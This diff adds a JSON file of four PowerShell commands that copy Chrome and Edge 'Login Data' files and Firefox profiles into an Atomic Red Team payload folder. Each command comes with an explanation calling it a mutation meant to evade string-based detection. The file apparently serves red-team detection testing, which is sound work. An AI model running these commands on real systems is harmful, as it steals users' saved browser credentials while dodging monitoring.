@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe -Command \"Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data' -Destination 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads' -Force\"",
+    "explanation": "This command uses PowerShell's `Copy-Item` to copy browser data files. It applies safe mutation techniques such as omitting unnecessary braces, using direct command invocation, and simplifying the syntax while retaining the same behavior. The command remains functionally equivalent to the original but is slightly obfuscated."
+  },
+  {
+    "output": "powershell.exe -Command \"Copy-Item -Path '$env:APPDATA\\Mozilla\\Firefox\\Profiles\\' -Destination 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads' -Recurse\"",
+    "explanation": "This command uses PowerShell's `Copy-Item` with reordered arguments and simplified syntax. It removes unnecessary braces and uses the `-Path` parameter explicitly for clarity. The command is still functionally equivalent to the original but is slightly altered to test detection evasion."
+  },
+  {
+    "output": "powershell.exe -Command \"cp '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data' 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads'\"",
+    "explanation": "This command uses the `cp` alias for `Copy-Item`, which is a valid substitution in PowerShell. It also omits optional parameters while preserving the core functionality. The command is shorter and uses a common alias, making it less likely to trigger detection based on exact command string matching."
+  },
+  {
+    "output": "powershell.exe -Command \"Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data' -Destination 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads' -Force -Recurse\"",
+    "explanation": "This command uses the full `Copy-Item` syntax with explicit parameters and no unnecessary braces. It is a direct but slightly simplified version of the original command, making it a safe mutation for testing detection evasion."
+  }
+]
